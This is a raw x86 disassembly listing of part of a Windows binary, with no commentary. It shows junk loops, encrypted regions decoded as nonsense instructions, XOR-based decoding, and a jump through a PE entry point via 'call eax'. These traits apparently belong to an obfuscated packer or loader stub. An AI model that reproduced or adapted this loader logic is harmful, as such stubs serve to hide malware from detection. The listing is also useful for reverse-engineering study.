  406266:	and    DWORD PTR ds:0x4338a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	dec    esp
  406312:	scas   al,BYTE PTR es:[edi]
  406313:	scas   al,BYTE PTR es:[edi]
  406314:	pop    esp
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	mov    ebp,0x83daa469
  406322:	cwde   
  406323:	push   ecx
  406324:	int    0xb
  406326:	add    ecx,DWORD PTR [edi-0x45aad4de]
  40632c:	xchg   BYTE PTR [edx+edx*1+0x76],al
  406330:	ja     0x4062e7
  406332:	add    edi,DWORD PTR [ecx+0x4]
  406335:	fstp   TBYTE PTR [edx-0x79171d06]
  40633b:	add    BYTE PTR [eax],0xad
  40633e:	mov    ds:0x37857116,al
  406343:	rcr    DWORD PTR [edx+0x747647f6],1
  406349:	adc    ebx,edx
  40634b:	jmp    0x406379
  40634d:	ror    BYTE PTR [esi+0x3d],0x24
  406351:	mov    ah,0xc2
  406353:	stc    
  406354:	jne    0x406377
  406356:	adc    al,BYTE PTR [eax-0x3d]
  406359:	pop    edx
  40635a:	pop    esp
  40635b:	test   DWORD PTR [edi],ebx
  40635d:	cwde   
  40635e:	sahf   
  40635f:	pop    ss
  406360:	sub    esp,DWORD PTR ds:0x71c0e453
  406366:	(bad)  
  406367:	shl    bl,1
  406369:	inc    eax
  40636a:	fbstp  TBYTE PTR [ebp-0x5b1b3534]
  406370:	fidiv  DWORD PTR [ebx+ecx*1]
  406373:	push   ss
  406374:	mov    BYTE PTR [edx],0x18
  406377:	sub    ebx,DWORD PTR [eax-0x54]
  40637a:	test   DWORD PTR [ebx+0x4],0x4f67546
  406381:	ss jge 0x4063d4
  406384:	cmp    DWORD PTR [ebx],eax
  406386:	fsave  [edi+0x4f]
  40638a:	mov    DWORD PTR [edi],ecx
  40638c:	xchg   ebx,eax
  40638d:	jbe    0x406407
  40638f:	pop    ebx
  406390:	and    eax,0x44191c1a
  406395:	adc    eax,0x5f8858ee
  40639a:	xchg   esp,eax
  40639b:	aad    0x3f
  40639d:	mov    eax,ds:0x259c53c6
  4063a2:	cli    
  4063a3:	adc    BYTE PTR [ebp+0x3c07f6a2],al
  4063a9:	int    0xda
  4063ab:	leave  
  4063ac:	mov    ah,0xf5
  4063ae:	xor    DWORD PTR [esi-0x306a770],0x2d
  4063b5:	aad    0xf1
  4063b7:	aam    0x11
  4063b9:	stos   DWORD PTR es:[edi],eax
  4063ba:	rcl    BYTE PTR [ecx-0x57b42813],1
  4063c0:	sub    cl,ah
  4063c2:	pop    es
  4063c3:	and    BYTE PTR [ebx-0x38fdf914],cl
  4063c9:	mov    bh,0x16
  4063cb:	mov    al,0xee
  4063cd:	call   0xb0b84959
  4063d2:	inc    ecx
  4063d3:	in     eax,dx
  4063d4:	stc    
  4063d5:	arpl   WORD PTR [edx-0x3498fd6b],cx
  4063db:	fnstcw WORD PTR [esi+0x71]
  4063de:	xor    eax,0x6f3878bc
  4063e3:	push   cs
  4063e4:	loop   0x406440
  4063e6:	shl    BYTE PTR [esi],cl
  4063e8:	cmp    edi,DWORD PTR es:[ebp-0x4f]
  4063ec:	mov    al,0x8
  4063ee:	cwde   
  4063ef:	lds    ebx,FWORD PTR [ebx+0x35]
  4063f2:	jecxz  0x406404
  4063f4:	aad    0x14
  4063f6:	jns    0x406390
  4063f8:	gs jmp 0x30a800f3
  4063fe:	mov    eax,ds:0x9c1c8e4
  406403:	sahf   
  406404:	clc    
  406405:	dec    ebx
  406406:	jae    0x40644a
  406408:	or     edx,DWORD PTR [eax+0x3da8c184]
  40640e:	int    0xab
  406410:	mov    cl,0x1e
  406412:	cmp    ah,cl
  406414:	gs push ds
  406416:	adc    bh,bh
  406418:	sbb    DWORD PTR [eax],ebp
  40641a:	or     eax,0xc28e4a09
  40641f:	adc    al,0x4d
  406421:	ss inc esp
  406423:	dec    edx
  406424:	jns    0x406428
  406426:	add    al,0x4d
  406428:	int3   
  406429:	popf   
  40642a:	pop    ebp
  40642b:	mov    eax,0xd0d9d117
  406430:	jg     0x4063b8
  406432:	(bad)  
  406433:	ja     0x40646a
  406435:	xor    eax,0x4ccc40e7
  40643a:	stos   BYTE PTR es:[edi],al
  40643b:	fdivr  DWORD PTR [ebp-0x76]
  40643e:	xor    dh,BYTE PTR [ebx+0x3cbd48fb]
  406444:	arpl   ax,bp
  406446:	and    eax,0x669d0e3c
  40644b:	cmc    
  40644c:	cmp    BYTE PTR [edi+0x4c8b37d2],ah
  406452:	xor    edx,esi
  406454:	cmp    BYTE PTR [eax-0x5d20c3c4],al
  40645a:	outs   dx,BYTE PTR ds:[esi]
  40645b:	into   
  40645c:	cmp    al,0x7d
  40645e:	mov    gs,WORD PTR [edi]
  406460:	fsubr  DWORD PTR [esi-0x4430f416]
  406466:	mov    es,WORD PTR [ebp-0x6]
  406469:	in     eax,dx
  40646a:	scas   al,BYTE PTR es:[edi]
  40646b:	dec    ebp
  40646c:	cdq    
  40646d:	arpl   WORD PTR [edi+0x4c],sp
  406470:	fsubr  st(0),st
  406472:	ins    DWORD PTR es:[edi],dx
  406473:	push   ss
  406474:	or     eax,0xf47ba1de
  406479:	vmwrite ecx,DWORD PTR [ecx-0x2b]
  40647d:	mov    ebx,0xc7ce80e7
  406482:	mov    BYTE PTR [esp+ebx*2+0x71],cl
  406486:	or     eax,0x796baae1
  40648b:	sahf   
  40648c:	push   cs
  40648d:	sbb    ebx,DWORD PTR [eax+0x6e]
  406490:	loope  0x406499
  406492:	pusha  
  406493:	dec    ebp
  406494:	dec    ebx
  406495:	xor    eax,0x80ba75de
  40649b:	mov    esp,0xc57bc5fc
  4064a0:	xchg   BYTE PTR [ebx],cl
  4064a2:	in     eax,dx
  4064a3:	sub    DWORD PTR [ebp+0x1df231ce],ecx
  4064a9:	cmp    dh,BYTE PTR [ecx-0x1e8cbd4b]
  4064af:	mov    ecx,0xbbd3ec45
  4064b4:	imul   edi,eax,0x2a
  4064b7:	lds    ebp,FWORD PTR [ebp+0x12a5282c]
  4064bd:	hlt    
  4064be:	aam    0x50
  4064c0:	loope  0x406533
  4064c2:	sysexit 
  4064c4:	cli    
  4064c5:	stos   DWORD PTR es:[edi],eax
  4064c6:	ret    
  4064c7:	and    dh,BYTE PTR [eax]
  4064c9:	sbb    al,0xb5
  4064cb:	ret    0x9ff3
  4064ce:	jnp    0x4064f3
  4064d0:	ss sbb al,0x69
  4064d3:	(bad)  
  4064d4:	rol    DWORD PTR [ecx-0x5c],cl
  4064d7:	jge    0x406499
  4064d9:	hlt    
  4064da:	mov    WORD PTR [ebp+0x68],ss
  4064dd:	sub    eax,DWORD PTR [edx]
  4064df:	nop
  4064e0:	pop    edx
  4064e1:	gs in  eax,dx
  4064e3:	sbb    eax,0xc3998905
  4064e8:	pop    es
  4064e9:	push   0xffffffcf
  4064eb:	dec    eax
  4064ec:	and    ecx,esi
  4064ee:	(bad)  
  4064f0:	stos   BYTE PTR es:[edi],al
  4064f1:	mov    eax,cs
  4064f3:	pop    edx
  4064f4:	dec    eax
  4064f5:	imul   esi,DWORD PTR [bx+si],0x45
  4064f9:	arpl   WORD PTR [eax-0x5957c3fa],cx
  4064ff:	and    al,ch
  406501:	outs   dx,BYTE PTR ds:[esi]
  406502:	mov    bl,0x5c
  406504:	dec    eax
  406505:	jmp    0x86287a8
  40650a:	inc    ebp
  40650b:	inc    esi
  40650c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40650d:	inc    ecx
  40650e:	push   0x17
  406510:	stos   DWORD PTR es:[edi],eax
  406511:	test   eax,0x6a3848e
  406516:	xchg   ebx,eax
  406517:	ffreep st(1)
  406519:	enter  0xc4d5,0xa7
  40651d:	pushf  
  40651e:	push   cs
  40651f:	xchg   ah,dl
  406521:	add    ah,BYTE PTR [esi+0xd243795]
  406527:	dec    ecx
  406528:	cmp    eax,0xeaadee80
  40652d:	dec    ebp
  40652e:	inc    edi
  40652f:	hlt    
  406530:	push   esi
  406531:	out    0xa7,al
  406533:	push   es
  406534:	push   ebx
  406535:	mov    al,ds:0xe4cfc32d
  40653a:	mov    eax,0xb68d8048
  40653f:	pop    ebp
  406540:	xchg   ebp,eax
  406541:	mov    edi,0x49690bd6
  406546:	xor    dh,ah
  406548:	or     eax,DWORD PTR [esi]
  40654a:	(bad)  
  40654b:	test   DWORD PTR [ebp+0x7832dcfb],ebp
  406551:	and    ecx,DWORD PTR [ebx]
  406553:	or     cl,ah
  406555:	scas   al,BYTE PTR es:[edi]
  406556:	dec    esp
  406557:	nop
  406558:	in     al,dx
  406559:	cmp    al,0xb9
  40655b:	fcom   DWORD PTR [edi-0x3c]
  40655e:	xlat   BYTE PTR ds:[ebx]
  40655f:	dec    esp
  406560:	xchg   ecx,eax
  406561:	jnp    0x4065b3
  406563:	aad    0xb1
  406565:	sub    esp,DWORD PTR [edx+0x21]
  406568:	lock ds dec ecx
  40656b:	into   
  40656c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40656d:	push   es
  40656e:	add    dl,BYTE PTR es:[ecx-0xa]
  406572:	fistp  DWORD PTR [esi-0x6974aa58]
  406578:	not    BYTE PTR [esp+ecx*2]
  40657b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657c:	repz fs add ebx,esi
  406580:	idiv   bh
  406582:	push   es
  406583:	add    ch,cl
  406585:	sti    
  406586:	xchg   BYTE PTR [ecx],bh
  406588:	jnp    0x4065ad
  40658a:	or     eax,0x16a89aea
  40658f:	sahf   
  406590:	push   cs
  406591:	mov    eax,ds:0xeba09c8b
  406596:	inc    BYTE PTR [edx+0x3a]
  406599:	pushf  
  40659a:	and    ebp,edi
  40659c:	add    esp,DWORD PTR [edi-0x11f2cdfe]
  4065a2:	pop    es
  4065a3:	mov    dh,0xe1
  4065a5:	popf   
  4065a6:	adc    BYTE PTR [esi-0x6f1291e2],dl
  4065ac:	push   ecx
  4065ad:	xor    al,BYTE PTR [edx]
  4065af:	cli    
  4065b0:	sbb    bl,ah
  4065b2:	dec    ebp
  4065b3:	push   ebx
  4065b4:	bnd jbe 0x406618
  4065b7:	test   eax,0xb37d2541
  4065bc:	or     BYTE PTR [ebp-0x77],cl
  4065bf:	jae    0x4065d1
  4065c1:	mov    ch,0x45
  4065c3:	mov    al,0x7e
  4065c5:	fistp  QWORD PTR [eax+ebp*1]
  4065c8:	ins    BYTE PTR es:[edi],dx
  4065c9:	shl    DWORD PTR ds:[edx*8-0x90722cc],1
  4065d1:	pop    ss
  4065d2:	sti    
  4065d3:	xor    bl,BYTE PTR [esi-0x2710bbf8]
  4065d9:	dec    dh
  4065db:	ror    ah,0xec
  4065de:	push   cs
  4065df:	test   esp,ebp
  4065e1:	sbb    al,0x4d
  4065e3:	dec    edi
  4065e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e5:	and    BYTE PTR ds:0xa3b43000,dl
  4065eb:	mov    eax,ds:0xc421a474
  4065f0:	and    dl,BYTE PTR [eax+0x5a]
  4065f3:	retf   
  4065f4:	aam    0x3e
  4065f6:	mov    WORD PTR [edx-0x44a88383],?
  4065fc:	push   esp
  4065fd:	idiv   BYTE PTR [esp+esi*8]
  406600:	cmp    eax,DWORD PTR [ecx]
  406602:	mov    ch,0xf
  406604:	ins    BYTE PTR es:[edi],dx
  406605:	dec    esi
  406606:	or     BYTE PTR [edi-0x38],bl
  406609:	add    al,0xb0
  40660b:	dec    ebx
  40660c:	dec    esi
  40660d:	dec    ecx
  40660e:	mov    al,ds:0x152324f2
  406613:	imul   ecx,DWORD PTR [ecx-0x7208b87c],0xffffffc8
  40661a:	imul   BYTE PTR [edi]
  40661c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40661d:	adc    eax,0x959db5f1
  406622:	adc    eax,0x7b2e20a
  406627:	fdivr  QWORD PTR [ebp+eax*2-0x1f3bf322]
  40662f:	call   0xef780a03
  406634:	fdiv   DWORD PTR [eax+0x72e33b28]
  40663a:	sub    ebp,ecx
  40663c:	js     0x40669d
  40663e:	jecxz  0x40666d
  406640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406641:	pop    ebp
  406642:	cdq    
  406643:	jle    0x406650
  406645:	add    cl,dl
  406647:	bound  eax,QWORD PTR [ecx]
  406649:	jmp    edi
  40664b:	pop    edi
  40664c:	jl     0x4065e8
  40664e:	(bad)  
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x3bbc7b5f
  406b85:	in     eax,dx
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0xaa7e7e7f
  406b8f:	add    al,0xe1
  406b91:	out    0xb4,eax
  406b93:	ins    DWORD PTR es:[edi],dx
  406b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b95:	(bad)  
  406b96:	sti    
  406b97:	inc    esi
  406b98:	cmp    dl,BYTE PTR [ecx+eiz*1]
  406b9b:	js     0x406b93
  406b9d:	ret    
  406b9e:	imul   ebp,edi,0xfffffffb
  406ba1:	mov    edi,0x9f7c75dc
  406ba6:	inc    eax
  406ba7:	aam    0xcd
  406ba9:	mov    al,0x9e
  406bab:	push   ss
  406bac:	mov    al,cl
  406bae:	shr    DWORD PTR [edi],cl
  406bb0:	pop    edx
  406bb1:	dec    ebx
  406bb2:	popa   
  406bb3:	gs dec esp
  406bb5:	repnz (bad) 
  406bb7:	adc    cl,al
  406bb9:	shl    BYTE PTR [ebp+edi*8+0x670d16d9],0xc4
  406bc1:	dec    esi
  406bc2:	in     al,0xb2
  406bc4:	cmp    eax,DWORD PTR [edx]
  406bc6:	push   edi
  406bc7:	cli    
  406bc8:	inc    ebp
  406bc9:	adc    DWORD PTR [edi+0x2b],esi
  406bcc:	sti    
  406bcd:	dec    edi
  406bce:	jns    0x406bf3
  406bd0:	xchg   ebx,eax
  406bd1:	push   ds
  406bd2:	push   esp
  406bd3:	inc    eax
  406bd4:	cmp    dl,bh
  406bd6:	dec    ebx
  406bd7:	push   0x8039dd8c
  406bdc:	in     eax,0xe1
  406bde:	xchg   edx,eax
  406bdf:	sbb    DWORD PTR [ebx],esp
  406be1:	popa   
  406be2:	(bad)  
  406be4:	cld    
  406be5:	xchg   cl,bh
  406be7:	push   ebp
  406be8:	add    al,0xb1
  406bea:	mov    ds:0xc05e27a7,eax
  406bef:	add    BYTE PTR [ebx-0x7d826101],0xa2
  406bf6:	sar    ebx,cl
  406bf8:	sub    bh,BYTE PTR ds:[ecx-0x43]
  406bfc:	sbb    eax,0x1e3bb5b
  406c01:	fsubr  DWORD PTR [ebx-0x1c]
  406c04:	in     eax,0xf1
  406c06:	mov    ecx,0x9c7f5b60
  406c0b:	xor    BYTE PTR [ecx],cl
  406c0d:	fistp  DWORD PTR [edx]
  406c0f:	inc    esp
  406c10:	nop
  406c11:	sbb    BYTE PTR [eax+0x3d2fa278],0x7e
  406c18:	mov    eax,ss:0xe2bd6441
